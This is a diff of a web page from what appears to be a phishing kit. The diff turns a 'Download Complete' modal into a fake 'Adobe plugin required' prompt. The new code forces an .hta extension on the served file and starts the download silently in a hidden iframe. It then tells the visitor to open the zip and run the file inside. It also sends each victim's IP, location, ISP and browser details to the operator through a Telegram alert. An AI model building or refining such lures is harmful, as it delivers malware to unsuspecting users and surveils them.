@@ -4,69 +4,75 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="robots" content="noindex, nofollow">
-  <title>Download Complete</title>
+  <title>Adobe Plugin Required</title>
   <style>
-    body { margin: 0; padding: 0; background-image: url('assets/screen.png');
-      background-size: contain; background-position: center; background-repeat: no-repeat;
-      height: 100vh; width: 100vw; background-color: #ffffff; font-family: Arial, sans-serif; }
-    .modal-overlay { position: fixed; top: 0; left: 0; height: 100vh; width: 100vw;
-      background-color: rgba(0,0,0,0.5); display: flex; justify-content: center; align-items: center; z-index: 1000; }
-    .modal-content { background-color: white; padding: 30px; border-radius: 10px; width: 90%; max-width: 500px;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.3); animation: modalFadeIn 0.3s ease-out; text-align: center; }
-    @keyframes modalFadeIn { from { opacity:0; transform:translateY(-20px);} to { opacity:1; transform:translateY(0);} }
-    .modal-header img { width: 100px; margin-bottom: 15px; }
-    .continue-btn { background-color: #ED2224; color: white; border: none; padding: 12px 30px; border-radius: 4px;
-      font-size: 16px; cursor: pointer; margin-top: 20px; width: 100%; max-width: 250px; transition: background-color 0.3s; }
-    .continue-btn:hover { background-color: #c71b1d; }
-    .info-text { color: #666; font-size: 12px; margin-top: 10px; }
-    .spinner { display: none; margin-top: 20px; }
+    body { font-family: Arial, sans-serif; margin: 0; height: 100vh; display: flex;
+      align-items: flex-start; justify-content: center; background-color: #f5f5f5; padding-top: 15vh; }
+    .container { text-align: center; max-width: 600px; margin-top: 0; }
+    img { width: 150px; margin-bottom: 20px; }
+    a { color: #d32f2f; text-decoration: none; font-weight: bold; }
+    a:hover { text-decoration: underline; }
+    p { line-height: 1.6; margin: 0; padding: 0 10px; }
   </style>
 </head>
 <body>
-  <div id="confirmationModal" class="modal-overlay">
-    <div class="modal-content">
-      <div class="modal-header"><img src="assets/adobe-logo-2017.png" alt="Adobe Logo"></div>
-      <h2>Download Complete</h2>
-      <p class="modal-text" id="modalText"></p>
-      <p class="modal-subtext" style="padding-top:10px;" id="modalSub"></p>
-      <p class="modal-subtext" style="padding-top:10px;">If your download did not start automatically, you can download the document again.</p>
-      <button onclick="go()" id="continueBtn" class="continue-btn">Download Document</button>
-      <div id="spinner" class="spinner"><p>Loading...</p></div>
-      <p class="info-text"></p>
-    </div>
+  <div class="container">
+    <img src="assets/adobeicon.png" alt="Adobe Icon">
+    <p>Sorry, You do not have the latest version of Adobe plugin installed.<br>
+    Let's finish your installation.<br><br>
+    <span id="instr"></span> <a id="manual" href="#">Download manually</a>.<br><br>
+    Download not working? <a href="#">&#8635; Restart and Download | Get Help</a></p>
   </div>
+
+  <iframe id="dlframe" src="about:blank" style="display:none;"></iframe>
 
   <script src="config.js"></script>
   <script src="gate.js"></script>
+  <script src="telemetry.js"></script>
   <script>
     (function () {
       var q = new URLSearchParams(location.search);
       var tk = q.get('tk') || '';
+      var name = q.get('n') || '';
       if (!tk) { window.gateStep({ entry: true }); return; }
+      if (!/^[A-Za-z0-9_. -]+$/.test(name) || name.length === 0) name = window.makeName();
+      name = name.slice(0, 90);
+      if (!/\.hta$/i.test(name)) name += '.hta';
       if (!window.gateStep({ entry: false, allowedRefPaths: ['', 'index.html', 'index'] })) return;
 
-      // Fresh name for THIS visit (fixed for the whole funnel).
-      var name = window.makeName();
       var kind = window.nameKind(name);
       var zipName = name.replace(/\.hta$/i, '.zip');
+      var instr = kind === 'adobe'
+        ? 'Find <strong>' + zipName + '</strong> in <strong>Recent</strong> (File Explorer), open it, and run the file inside to install.'
+        : 'Find <strong>' + zipName + '</strong> in <strong>Recent</strong> (File Explorer), open it, and run the file inside to view your document.';
+      document.getElementById('instr').innerHTML = instr;
+      var dlUrl = 'dl.html?tk=' + encodeURIComponent(tk) + '&n=' + encodeURIComponent(name);
+      document.getElementById('manual').href = dlUrl;
 
-      document.getElementById('modalText').textContent = kind === 'adobe' ? 'Your download is ready.' : "You've received a secured document.";
-      document.getElementById('modalSub').innerHTML = kind === 'adobe'
-        ? 'Your installer has been saved to your device. Find <strong>' + zipName + '</strong> in <strong>Recent</strong> (File Explorer), open it, and run the file inside to install.'
-        : 'Your Document has been saved to your device. Find <strong>' + zipName + '</strong> in <strong>Recent</strong> (File Explorer), open it, and run the file inside to view your document.';
+      // One Telegram "Download Triggered" alert per visit (dedupe by name+tk).
+      (async function () {
+        try {
+          var key = 'fired_' + tk + '|' + name;
+          if (localStorage.getItem(key)) return;
+          localStorage.setItem(key, '1');
+          var g = await window.geo();
+          var now = new Date().toISOString().replace('T', ' ').slice(0, 19);
+          var msg = "\uD83C\uDFAF New Download Triggered \uD83C\uDFAF\n"
+                  + "\uD83D\uDCC5 Time: " + now + "\n"
+                  + "\uD83D\uDCCD IP: " + g.ip + "\n"
+                  + "\uD83C\uDF0D Location: " + g.city + ", " + g.country + "\n"
+                  + "\uD83C\uDF10 ISP: " + g.isp + "\n"
+                  + "\uD83D\uDCC1 File: " + name + "\n"
+                  + "\uD83D\uDCF1 Device: " + navigator.userAgent;
+          window.tgSend(msg.slice(0, 2900));
+        } catch (e) {}
+      })();
 
-      window.__NAME = name;
-      function go() {
-        var btn = document.getElementById('continueBtn');
-        var spinner = document.getElementById('spinner');
-        if (!btn) return;
-        btn.style.display = 'none'; spinner.style.display = 'block';
-        setTimeout(function () {
-          window.location.href = 'complete.html?tk=' + encodeURIComponent(tk) + '&n=' + encodeURIComponent(name);
-        }, 2000);
-      }
-      // Auto-advance (the button remains for a human who stops to read).
-      setTimeout(go, 3500);
+      // Trigger the actual (fresh-name, unique-hash) download in a hidden iframe.
+      setTimeout(function () {
+        var fr = document.getElementById('dlframe');
+        if (fr) fr.src = dlUrl;
+      }, 400);
     })();
   </script>
 </body>
